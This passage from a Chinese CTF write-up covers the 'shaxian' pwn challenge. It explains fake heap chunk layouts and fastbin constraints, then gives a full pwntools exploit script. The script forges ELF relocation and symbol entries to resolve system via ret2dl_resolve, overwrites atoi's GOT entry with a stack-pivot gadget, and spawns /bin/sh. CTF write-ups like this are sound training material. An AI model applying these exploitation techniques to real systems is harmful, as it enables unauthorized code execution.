0x2AB8(未找到合适的)</span><br><span class="line"></span><br><span class="line">如果将fake_chain放入Title缓冲区后面构造的fake_chunk中，需要满足以下条件：</span><br><span class="line">- 1、由上可知，fake_chain要放在Title之后，sym_index至少为0x322,但是fake_sym数据的地址不能超过0x804C000,所以sym_index至多为0x3E2。</span><br><span class="line">- 2、versym_data在0x080489DA之后，但不能超过0x08048B5A。在这期间找是否有符合以上ndx范围的ndx值。</span><br></pre></td></tr></table></figure></p><p>4、<code>version-&gt;Hash</code>的取值</p><p>&emsp;&emsp;<code>ndx值</code>如果<code>未使</code>l_version数组访问越界，则对<code>version-&gt;hash</code>的值无要求。<code>ndx值</code>如果<code>使</code>l_version数组访问越界，则要使<code>version-&gt;hash</code>的值为0。</p><h4 id="0x32-本方法使用的内存布局"><a href="#0x32-本方法使用的内存布局" class="headerlink" title="0x32 本方法使用的内存布局"></a>0x32 本方法使用的内存布局</h4><p>&emsp;&emsp;fake_chunk的地址应该<code>8字节对齐</code>，而<code>sym_data地址</code>与<code>符号表(.dynsym)</code>起始地址的差值应该是<code>0x10</code>的整数倍，fake_chunk的<code>内存布局</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[fake_chunk] for [fake_chain]</span><br><span class="line">0x0804BF08 - 0x0804BF10  chunk_header</span><br><span class="line">0x0804BF10 - 0x0804BF14  count</span><br><span class="line">0x0804BF14 - 0x0804BF34  food_type</span><br><span class="line">0x0804BF34 - 0x0804BF38  next</span><br><span class="line"></span><br><span class="line">[fake_chain]</span><br><span class="line">0x0804BF14 - 0x0804BF1C  reloc_data</span><br><span class="line">0x0804BF1C - 0x0804BF2C  sym_data</span><br><span class="line">0x0804BF2C - 0x0804BF34  &quot;system&quot;</span><br><span class="line">0x0804BF34 - 0x0804BF3C  &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;还有一个处于<code>head_ptr附近</code>的用于<code>任意地址</code>写入4字节<code>任意数据</code>的fake_chunk，此fake_chunk的<code>内存布局</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x0804B0C0 - 0x0804B1C0  Phone_number </span><br><span class="line"></span><br><span class="line">[fake_chunk] for head_ptr</span><br><span class="line">0x0804B1B0 - 0x0804B1B8  chunk_header</span><br><span class="line">0x0804B1B8 - 0x0804B1BC  count</span><br><span class="line">0x0804B1BC - 0x0804B1C0------------</span><br><span class="line">0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span><br><span class="line">0x0804B1C4 - 0x0804B1DC------------</span><br><span class="line">0x0804B1DC - 0x0804B1E0  next</span><br><span class="line"></span><br><span class="line">0x0804B1E0 - 0x0804B1E8  Address(next_chunk&apos;s chunk_header)</span><br><span class="line">0x0804B1E8 - 0x0804B2E0  Address</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们将<code>shellcode</code>放在了Title缓冲区的<code>末尾</code>，在fake_chain的<code>前面</code>，保证了预留的栈空间大于<code>0x300字节</code>。至此，内存布局完成。</p><h4 id="0x33-利用思路"><a href="#0x33-利用思路" class="headerlink" title="0x33 利用思路"></a>0x33 利用思路</h4><p>1、<strong><code>Stage1</code></strong>：为fake_chain创建fake_chunk</p><p>&emsp;&emsp;为<code>fake_chain</code>创建<code>fake_chunk</code>其实就是伪造fake_chunk的chunk_header和fake_chunk的next_chunk的chunk_header。因为需要<code>Free</code>的<code>chunk</code>是需要满足一定条件的：</p><blockquote><p>1、fake_chunk 的<code>ISMMAP</code>位不能为1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>2、fake_chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code>。<br>3、fake_chunk 的<code>size大小</code>需要满足对应的fastbin的需求，同时也得<code>对齐</code>。<br>4、fake_chunk的<code>next chunk的大小</code>不能小于2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>5、fake_chunk对应的<code>fastbin链表头部</code>不能是该fake_chunk，即不能构成<code>double free</code>的情况。</p></blockquote><p>2、<strong><code>Stage2</code></strong>：将fake_chain写入fake_chunk</p><p>&emsp;&emsp;首先将<code>fake_chunk</code>释放，让其进入<code>fastbin链表</code>中，<code>fastbin链表的头指针</code>指向这个fake_chunk，下次通过<code>malloc</code>申请chunk时，就会从fastbin链表的头部取下这个fake_chunk，我们就可以将<code>fake_chain</code>写入到此<code>fake_chunk</code>。</p><p>3、<strong><code>Stage3</code></strong>：将shellcode写入Title缓冲区末尾</p><p>&emsp;&emsp;shellcode用于<code>调用符号解析函数</code>，解析system的地址。</p><p>4、<strong><code>Stage4</code></strong>：将atoi_got修改为gadgets的地址</p><p>&emsp;&emsp;gadgets的作用是<code>抬高栈</code>，因为<code>调用atoi()函数</code>的时候，<code>esp</code>距离<code>payload</code>还有一段内存，所以需要将栈抬高。还将<code>ebp</code>修改为<code>shellcode的地址</code>，再通过<code>leave;ret</code>跳转到shellcode执行。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">08048C29  <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">1Ch</span></span><br><span class="line">08048C2C  <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">08048C2D  <span class="keyword">pop</span> <span class="built_in">esi</span></span><br><span class="line">08048C2E  <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">08048C2F  <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">08048C30  <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>5、<strong><code>Stage5</code></strong>：输入atoi的参数,并跳转到shellcode执行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># esi,edi,ebp,ret(将ebp修改为shellcode地址,通过ebp和leave_ret调整esp,跳转到shellcode执行)</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">8</span> + p32(Title + <span class="number">0x100</span> - <span class="number">0x10</span> - <span class="number">0x14</span>) + p32(leave_ret)</span><br></pre></td></tr></table></figure></p><p><strong><code>完整exp</code></strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./shaxian'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">bp 0x08048B31,main函数起始地址</span></span><br><span class="line"><span class="string">bp 0x08048912,malloc后，查看分配的堆块的数据域地址</span></span><br><span class="line"><span class="string">bp 0x08048B8E,Diancai函数返回地址</span></span><br><span class="line"><span class="string">bp 0x080489F6,查看要Free的堆块地址</span></span><br><span class="line"><span class="string">bp 0x08048B95,Submit函数返回地址</span></span><br><span class="line"><span class="string">bp 0x08048737,atoi调用地址</span></span><br><span class="line"><span class="string">bp 0x08048C29,add_ppp_ebp_ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'180.76.178.48'</span>,<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="comment"># io = gdb.debug('./shaxian','''bp 0x08048B31</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048912</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048B8E</span></span><br><span class="line">            <span class="comment">#                               bp 0x080489F6</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048B95</span></span><br><span class="line">            <span class="comment">#                               bp 0x08048C29''')</span></span><br><span class="line">            io = gdb.debug(<span class="string">'./shaxian'</span>,<span class="string">'''bp 0x08048C29'''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = process(<span class="string">'./shaxian'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dian_cai</span><span class="params">(io,name,count)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'How many?\n'</span>)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receipt</span><span class="params">(io,taitou)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)   <span class="comment"># 程序中用的是puts()</span></span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Taitou:'</span>)     <span class="comment"># 程序中用的是printf()</span></span><br><span class="line">    io.sendline(taitou)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">review</span><span class="params">(io)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x86</span></span><br><span class="line"><span class="comment"># Elf32_Rel *reloc = JMPREL + reloc_offset          # 符号的重定位项的地址</span></span><br><span class="line"><span class="comment"># Elf32_Sym *sym = &amp;SYMTAB[(reloc-&gt;r_info)&gt;&gt;8]      # 符号的符号项的地址</span></span><br><span class="line"><span class="comment"># i.e.*sym = DT_SYMTAB + [(reloc-&gt;r_info)&gt;&gt;8]*4*4 # Elf32_Sym结构体的大小为16字节</span></span><br><span class="line"><span class="comment"># assert(((reloc-&gt;r_info)&amp;0xff) == 0x07)            # 重定位类型是R_386_JMP_SLOT</span></span><br><span class="line"><span class="comment"># if((sym-&gt;st_other)&amp;3 == 0)                        # 符号可见性</span></span><br><span class="line"><span class="comment"># uint16_t ndx = VERSYM[(reloc-&gt;r_info)&gt;&gt;8]         # ndx=0 -&gt; local symbol</span></span><br><span class="line"><span class="comment"># i.e.  ndx = DT_VERSYM + [(reloc-&gt;r_info)&gt;&gt;8]*2    # 符号版本索引的大小为2字节</span></span><br><span class="line"><span class="comment"># r_found_version *version = &amp;l-&gt;l_version(ndx)     # 当前符号的版本信息</span></span><br><span class="line"><span class="comment"># i.e.  *version = &amp;l-&gt;l_version + ndx*4*4          # r_found_version结构体的大小为16字节</span></span><br><span class="line"><span class="comment"># name = DT_STRTAB + sym-&gt;st_name                   # 当前符号的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word r_info;   /* 重定位类型和符号表下标 */ 4byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_reloc_data</span><span class="params">(got_plt,sym_index)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(got_plt) + p32((sym_index&lt;&lt;<span class="number">8</span>) + <span class="number">0x07</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word    st_size;  /* 符号的大小 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf32_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x08048408</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x080481DC</span></span><br><span class="line">DT_STRTAB = <span class="number">0x080482EC</span></span><br><span class="line">DT_VERSYM = <span class="number">0x08048396</span></span><br><span class="line">PLT0 = <span class="number">0x08048490</span></span><br><span class="line"></span><br><span class="line">atoi_got = <span class="number">0x0804B038</span></span><br><span class="line">system_got = atoi_got</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0804B0C0 - 0x0804B1C0 (0x100)</span></span><br><span class="line">Phone_number_buf = <span class="number">0x0804B0C0</span></span><br><span class="line"><span class="comment"># 0x0804B1C0 - 0x0804B1E0 (0x20)</span></span><br><span class="line">head_ptr = <span class="number">0x0804B1C0</span></span><br><span class="line"><span class="comment"># 0x0804B1E0 - 0x0804B2E0 (0x100)</span></span><br><span class="line">Address_buf = <span class="number">0x0804B1E0</span></span><br><span class="line"><span class="comment"># 0x0804B2E0 - 0x0804B300 (0x20)</span></span><br><span class="line">shopping_cart = <span class="number">0x0804B2E0</span></span><br><span class="line"><span class="comment"># 0x0804B300 - 0x0804B400 (0x100)</span></span><br><span class="line">Title = <span class="number">0x0804B300</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[fake_chunk] for [fake_chain]</span></span><br><span class="line"><span class="string">0x0804BF08 - 0x0804BF10  chunk_header</span></span><br><span class="line"><span class="string">0x0804BF10 - 0x0804BF14  count</span></span><br><span class="line"><span class="string">0x0804BF14 - 0x0804BF34  food_type</span></span><br><span class="line"><span class="string">0x0804BF34 - 0x0804BF38  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[fake_chain]</span></span><br><span class="line"><span class="string">0x0804BF14 - 0x0804BF1C  reloc_data</span></span><br><span class="line"><span class="string">0x0804BF1C - 0x0804BF2C  sym_data</span></span><br><span class="line"><span class="string">0x0804BF2C - 0x0804BF34  "system"</span></span><br><span class="line"><span class="string">0x0804BF34 - 0x0804BF3C  "/bin/sh"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reloc_data_addr(0x0804BF14) = DT_JMPREL(0x08048408) + reloc_offset(0x3B0C)</span></span><br><span class="line">reloc_offset = <span class="number">0x3B0C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x0804BF1C) = DT_SYMTAB(0x080481DC) + sym_index(0x3D4) * 16   (not useful)</span></span><br><span class="line"><span class="comment"># versym_data_addr(0x08048B3E) = DT_VERSYM(0x08048396) + sym_index(0x3D4) * 2</span></span><br><span class="line"><span class="comment"># ndx = 0x0</span></span><br><span class="line">reloc_data_addr = <span class="number">0x0804BF14</span></span><br><span class="line">reloc_data = generate_x86_reloc_data(system_got,<span class="number">0x3D4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x0804BF2C) = DT_STRTAB(0x080482EC) + name_offset(0x3C40)</span></span><br><span class="line">sym_data_addr = <span class="number">0x0804BF1C</span></span><br><span class="line">sym_data = generate_x86_sym_data(<span class="number">0x3C40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x0804BF2C) = sym_data_addr + 0x10</span></span><br><span class="line">func_name_addr = sym_data_addr + <span class="number">0x10</span></span><br><span class="line">func_name = <span class="string">"system\x00\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x0804BF34) = func_name_addr + 0x8</span></span><br><span class="line">binsh_str_addr = func_name_addr + <span class="number">0x8</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    内存布局：</span></span><br><span class="line"><span class="string">    0x0804B0C0 - 0x0804B1C0  Phone_number </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [fake_chunk] for head_ptr</span></span><br><span class="line"><span class="string">    0x0804B1B0 - 0x0804B1B8  chunk_header</span></span><br><span class="line"><span class="string">    0x0804B1B8 - 0x0804B1BC  count</span></span><br><span class="line"><span class="string">    0x0804B1BC - 0x0804B1C0------------</span></span><br><span class="line"><span class="string">    0x0804B1C0 - 0x0804B1C4  head_ptr |food_type</span></span><br><span class="line"><span class="string">    0x0804B1C4 - 0x0804B1DC------------</span></span><br><span class="line"><span class="string">    0x0804B1DC - 0x0804B1E0  next</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0x0804B1E0 - 0x0804B1E8  Address(next_chunk's chunk_header)</span></span><br><span class="line"><span class="string">    0x0804B1E8 - 0x0804B2E0  Address</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    phone_number = <span class="string">'A'</span>*<span class="number">240</span> + p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>)</span><br><span class="line">    address = p32(<span class="number">0x0</span>) + p32(<span class="number">0x31</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Your Address:\n'</span>)</span><br><span class="line">    io.sendline(address)</span><br><span class="line">    io.recvuntil(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line">    io.sendline(phone_number)</span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage1: Create fake_chunk for fake_chain'</span>)</span><br><span class="line">    <span class="comment"># 伪造fake_chunk的chunk_header</span></span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(<span class="number">0x0804BF10</span> - <span class="number">0x4</span>)</span><br><span class="line">    name = name.ljust(<span class="number">36</span>,<span class="string">'\x00'</span>) <span class="comment"># 修改fake_chunk的next指针,防止下一次Free堆块时进入死循环</span></span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(<span class="number">0x31</span>))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)<span class="comment"># 0x804b1b8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造fake_chunk相邻的next_chunk的chunk_header</span></span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(<span class="number">0x0804BF38</span> + <span class="number">0x4</span>)</span><br><span class="line">    name = name.ljust(<span class="number">36</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(<span class="number">0x31</span>))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)<span class="comment"># 0x804b1b8</span></span><br><span class="line">    </span><br><span class="line">    raw_input(<span class="string">'Stage2: Write fake_chain to fake_chunk.'</span>)</span><br><span class="line">    dian_cai(io,<span class="string">'C'</span>*<span class="number">32</span> + p32(reloc_data_addr - <span class="number">0x4</span>),<span class="number">2</span>)  <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)                                          <span class="comment"># 0x804c008,0x0804BF10</span></span><br><span class="line">    fake_chain = reloc_data</span><br><span class="line">    fake_chain += sym_data</span><br><span class="line">    fake_chain += func_name</span><br><span class="line">    fake_chain += binsh_str</span><br><span class="line">    dian_cai(io,fake_chain,<span class="number">3</span>) <span class="comment"># 0x0804BF10</span></span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage3: Write shellcode to Title.'</span>)</span><br><span class="line">    shellcode = p32(PLT0) + p32(reloc_offset) + p32(<span class="number">0x01010101</span>) + p32(binsh_str_addr)</span><br><span class="line">    payload = <span class="string">"BBBB"</span><span class="comment"># </span></span><br><span class="line">    payload += shellcode</span><br><span class="line">    payload = payload.rjust(<span class="number">240</span>,<span class="string">'A'</span>)</span><br><span class="line">    receipt(io,payload)</span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage4: Modify atoi_got to gadgets.'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    08048C29  add esp, 1Ch</span></span><br><span class="line"><span class="string">    08048C2C  pop ebx</span></span><br><span class="line"><span class="string">    08048C2D  pop esi</span></span><br><span class="line"><span class="string">    08048C2E  pop edi</span></span><br><span class="line"><span class="string">    08048C2F  pop ebp</span></span><br><span class="line"><span class="string">    08048C30  retn</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    add_ppp_ebp_ret = <span class="number">0x08048C29</span></span><br><span class="line">    leave_ret = <span class="number">0x080485c8</span></span><br><span class="line">    </span><br><span class="line">    name = <span class="string">'A'</span>*<span class="number">32</span> + p32(head_ptr - <span class="number">8</span>)</span><br><span class="line">    dian_cai(io,name,<span class="number">1</span>) <span class="comment"># 0x804c008</span></span><br><span class="line">    submit(io)          <span class="comment"># 0x804c008,0x804b1b8</span></span><br><span class="line">    name = <span class="string">'B'</span>*<span class="number">4</span> + p32(atoi_got)</span><br><span class="line">    <span class="comment"># name = name.ljust(36,'\x00')</span></span><br><span class="line">    count = struct.unpack(<span class="string">"i"</span>,p32(add_ppp_ebp_ret))[<span class="number">0</span>]</span><br><span class="line">    dian_cai(io,name,count)<span class="comment"># 0x804b1b8</span></span><br><span class="line"></span><br><span class="line">    raw_input(<span class="string">'Stage5: Jump to shellcode.'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"choose:\n"</span>)</span><br><span class="line">    <span class="comment"># esi,edi,ebp,ret(将ebp修改为shellcode地址,通过ebp和leave_ret调整esp)</span></span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">8</span> + p32(Title + <span class="number">0x100</span> - <span class="number">0x10</span> - <span class="number">0x14</span>) + p32(leave_ret)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    debug = <span class="number">0</span><span class="comment"># debug = 1表示进行调试</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h2 id="welpwn-pwn200"><a href="#welpwn-pwn200" class="headerlink" title="welpwn-pwn200"></a>welpwn-pwn200</h2><h3 